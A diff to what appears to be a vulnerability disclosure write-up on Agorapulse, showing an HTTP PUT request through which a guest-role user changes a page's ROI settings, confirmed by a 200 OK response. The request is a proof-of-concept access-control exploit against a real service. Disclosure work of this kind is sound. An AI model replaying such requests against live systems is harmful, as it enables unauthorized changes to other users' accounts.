@@ -140,20 +140,24 @@ In the below request, by passing the id parameter of a page, a user with guest p
 
 
 ```http
-PUT /api/organizations/287159/workspaces/187160/settings/roi/accounts/facebook_574024 HTTP/1.1 
+PUT /api/organizations/287159/workspaces/187160/settings/roi/accounts/facebook_574024 HTTP/1.1
 Host: api.report.agorapulse.com
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0 
-Accept: application/json, text/plain, */* 
-Accept-Language: en-US,en;q=0.5 
-Referer: https://app.agorapulse.com/ 
-Agorapulse-Agent: manager-2021.08.04.1214 
-Authorization: Bearer
-Content-Type: application/json 
-Content-Length: 118 
-Origin: https://app.agorapulse.com 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Referer: https://app.agorapulse.com/
+Agorapulse-Agent: manager-2021.08.04.1214
+Authorization: Bearer VALUE
+Content-Type: application/json
+Content-Length: 118
+Origin: https://app.agorapulse.com
 
 {"roiEnabled":true,"postImpressionValue":5,"postLinkClickValue":1,"userEngagedValue":1,"accountUid":"facebook_574024"}
 ```
+
+
+
+
 
 
 The above request returned a '200 OK' response, indicating that changes were made to the target page. By returning to the ROI setting of a page through an admin account, we were able to confirm that an attacker with the guest role was indeed able to change the ROI setting of the page.
